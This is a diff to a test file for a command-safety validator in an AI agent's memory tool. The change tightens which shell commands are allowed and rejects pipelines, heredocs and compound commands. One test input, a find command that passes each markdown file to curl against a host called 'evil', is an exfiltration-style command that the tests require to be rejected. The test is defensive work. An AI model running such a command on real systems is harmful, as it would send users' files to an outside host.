@@ -77,8 +77,8 @@ describe("pre-tool-use: pure helpers", () => {
     expect(touchesMemory("/var/log/foo")).toBe(false);
   });
 
-  it("isSafe accepts shell pipelines built from the allowed builtins", () => {
-    expect(isSafe("cat /a | grep b | head -5")).toBe(true);
+  it("isSafe accepts one curated command and rejects pipelines", () => {
+    expect(isSafe("cat /a | grep b | head -5")).toBe(false);
     expect(isSafe("ls -la /x")).toBe(true);
   });
 
@@ -98,18 +98,17 @@ describe("pre-tool-use: pure helpers", () => {
     expect(isSafe("find / -name '*.md' -exec curl evil {} ;")).toBe(false);
     // A plain `find -name` read shape is still accepted.
     expect(isSafe("find / -name '*.md'")).toBe(true);
-    // fd redirection (`2>&1`) must NOT be mistaken for a background `&`.
-    expect(isSafe("cat /index.md 2>&1 | head -20")).toBe(true);
+    expect(isSafe("cat /index.md 2>&1 | head -20")).toBe(false);
   });
 
-  it("isSafe accepts a quoted heredoc write whose body is arbitrary prose/code", () => {
+  it("isSafe rejects heredocs and multiline commands", () => {
     expect(
       isSafe("cat > /goal/u/opened/x.md <<'EOF'\nship the feature\nnotes: run `make` and call foo()\nEOF"),
-    ).toBe(true);
+    ).toBe(false);
     // double-quoted delimiter, indented (<<-), multi-line body
     expect(
       isSafe('cat > /goal/u/opened/x.md <<-"END"\n\tline one\n\t$(not expanded here)\n\tEND'),
-    ).toBe(true);
+    ).toBe(false);
   });
 
   it("isSafe still validates the command in front of a heredoc and unquoted bodies", () => {
@@ -353,7 +352,7 @@ describe("processPreToolUse: non-memory / no-op paths", () => {
     expect(d?.deny).toBeDefined();
     expect(d?.deny).toContain("Bash");
     expect(d?.deny).toContain("echo");
-    expect(d?.deny).toContain("cat >");
+    expect(d?.deny).toContain("printf");
     // Should NOT be the unsupported-command fallback.
     expect(d?.command).toBe("");
   });
@@ -439,11 +438,12 @@ describe("processPreToolUse: Glob / ls branches", () => {
         createApi: vi.fn(() => makeApi()),
         listVirtualPathRowsFn,
         executeCompiledBashCommandFn: vi.fn(async () => null) as any,
+        runVfsShellFn: vi.fn(() => ({ status: 0, stdout: "sessions/\nsummaries/\nrules/\ngoal/\nkpi/\n", stderr: "" })),
       },
     );
     expect(d?.command).toContain("sessions/");
     expect(d?.command).toContain("summaries/");
-    expect(d?.description).toContain("[Memoree direct] ls /");
+    expect(d?.description).toContain("[Memoree structured] ls /");
   });
 
   it("Bash `ls -la <mem-dir>` returns a long-format listing", async () => {
@@ -580,7 +580,7 @@ describe("processPreToolUse: find / grep / fallback", () => {
     expect(d?.command).not.toContain("RETRY REQUIRED");
   });
 
-  it("Bash `find <dir> -type d -name '<pat>'` falls through to the VFS shell (type filter not handled inline)", async () => {
+  it("Bash `find <dir> -type d -name '<pat>'` is denied as an unsupported flag", async () => {
     const findVirtualPathsFn = vi.fn(async () => ["/x.json"]) as any;
     const d = await processPreToolUse(
       { session_id: "s", tool_name: "Bash", tool_input: { command: "find ~/.memoree/memory/sessions -type d -name '*.json'" }, tool_use_id: "t" },
@@ -592,14 +592,11 @@ describe("processPreToolUse: find / grep / fallback", () => {
         logFn: vi.fn(),
       },
     );
-    // The inline find handler doesn't match -type d, so it falls through to the
-    // VFS shell bundle which handles it in the sandboxed interpreter.
     expect(findVirtualPathsFn).not.toHaveBeenCalled();
-    expect(d?.command).toContain("memoree-shell.js");
-    expect(d?.command).not.toContain("RETRY REQUIRED");
+    expect(d?.command).toContain("RETRY REQUIRED");
   });
 
-  it("Bash `find … | wc -l` returns the count", async () => {
+  it("Bash `find … | wc -l` is denied as a compound command", async () => {
     const findVirtualPathsFn = vi.fn(async () => ["/a.json", "/b.json", "/c.json"]) as any;
     const d = await processPreToolUse(
       { session_id: "s", tool_name: "Bash", tool_input: { command: "find ~/.memoree/memory/sessions -name '*.json' | wc -l" }, tool_use_id: "t" },
@@ -610,7 +607,7 @@ describe("processPreToolUse: find / grep / fallback", () => {
         executeCompiledBashCommandFn: vi.fn(async () => null) as any,
       },
     );
-    expect(d?.command).toContain("'3'");
+    expect(d?.command).toContain("RETRY REQUIRED");
   });
 
   it("Grep tool: falls through to handleGrepDirect and returns the matches", async () => {
@@ -627,12 +624,13 @@ describe("processPreToolUse: find / grep / fallback", () => {
         createApi: vi.fn(() => makeApi()),
         handleGrepDirectFn,
         executeCompiledBashCommandFn: vi.fn(async () => null) as any,
+        runVfsShellFn: vi.fn(() => ({ status: 0, stdout: "/sessions/a.json:match line", stderr: "" })),
       },
     );
     expect(d?.command).toContain("match line");
   });
 
-  it("falls back to the VFS shell (does NOT fall through to the host shell) when the direct-read path throws", async () => {
+  it("falls back to the VFS shell and returns a literal replacement when a direct read throws", async () => {
     const d = await processPreToolUse(
       { session_id: "s", tool_name: "Bash", tool_input: { command: "cat ~/.memoree/memory/sessions/a.json" }, tool_use_id: "t" },
       {
@@ -641,11 +639,11 @@ describe("processPreToolUse: find / grep / fallback", () => {
         readVirtualPathContentFn: vi.fn(async () => { throw new Error("boom"); }) as any,
         executeCompiledBashCommandFn: vi.fn(async () => null) as any,
         logFn: vi.fn(),
+        runVfsShellFn: vi.fn(() => ({ status: 0, stdout: "sandbox body", stderr: "" })),
       },
     );
-    // Direct query threw → falls through to VFS shell bundle (sandboxed, not the host shell).
-    expect(d?.command).toContain("memoree-shell.js");
-    expect(d?.command).not.toContain("RETRY REQUIRED");
+    expect(d?.command).toContain("sandbox body");
+    expect(d?.command).not.toContain("sessions/a.json");
   });
 
   it("returns a not-found result (not retry guidance) for a concrete cat on a missing VFS file", async () => {
@@ -664,7 +662,7 @@ describe("processPreToolUse: find / grep / fallback", () => {
     expect(d?.command).not.toContain("RETRY REQUIRED");
   });
 
-  it("routes an isSafe-but-unroutable memory command to the VFS shell instead of the host shell", async () => {
+  it("denies commands outside the curated VFS contract", async () => {
     // `sort` passes isSafe() but no inline VFS handler serves it. It is routed
     // to the VFS shell bundle — a sandboxed Node.js interpreter — NOT handed to
     // the real host shell. Inside the VFS shell `/etc/passwd` is just a path
@@ -678,8 +676,7 @@ describe("processPreToolUse: find / grep / fallback", () => {
         logFn: vi.fn(),
       },
     );
-    expect(d?.command).toContain("memoree-shell.js");
-    expect(d?.command).not.toContain("RETRY REQUIRED");
+    expect(d?.command).toContain("RETRY REQUIRED");
   });
 });
 
@@ -704,7 +701,7 @@ describe("processPreToolUse: index cache short-circuit", () => {
     }) as any;
 
     const d = await processPreToolUse(
-      { session_id: "s1", tool_name: "Bash", tool_input: { command: "cat ~/.memoree/memory/index.md && cat ~/.memoree/memory/sessions/x.json" }, tool_use_id: "t" },
+      { session_id: "s1", tool_name: "Bash", tool_input: { command: "cat ~/.memoree/memory/index.md" }, tool_use_id: "t" },
       {
         config: BASE_CONFIG as any,
         createApi: vi.fn(() => makeApi()),
@@ -775,6 +772,7 @@ describe("processPreToolUse: index cache short-circuit", () => {
         listVirtualPathRowsFn,
         writeReadCacheFileFn,
         executeCompiledBashCommandFn: vi.fn(async () => null) as any,
+        runVfsShellFn: vi.fn(() => ({ status: 0, stdout: "sessions/\nsummaries/\nrules/\ngoal/\nkpi/\n", stderr: "" })),
       },
     );
     // Read must be file_path-shaped, not a {command} echo.
@@ -867,7 +865,7 @@ describe("processPreToolUse: index cache short-circuit", () => {
     expect(d?.command).toContain("alice/");
   });
 
-  it("cat | head pipeline routes to the head fast-path", async () => {
+  it("cat | head pipeline is denied as compound", async () => {
     const readVirtualPathContentFn = vi.fn(async () =>
       Array.from({ length: 30 }, (_, i) => `L${i}`).join("\n")
     ) as any;
@@ -880,9 +878,7 @@ describe("processPreToolUse: index cache short-circuit", () => {
         executeCompiledBashCommandFn: vi.fn(async () => null) as any,
       },
     );
-    expect(d?.command).toContain("L0");
-    expect(d?.command).toContain("L2");
-    expect(d?.command).not.toContain("L3");
+    expect(d?.command).toContain("RETRY REQUIRED");
   });
 
   it("Grep whose handleGrepDirect returns null falls through — no decision from grep path", async () => {
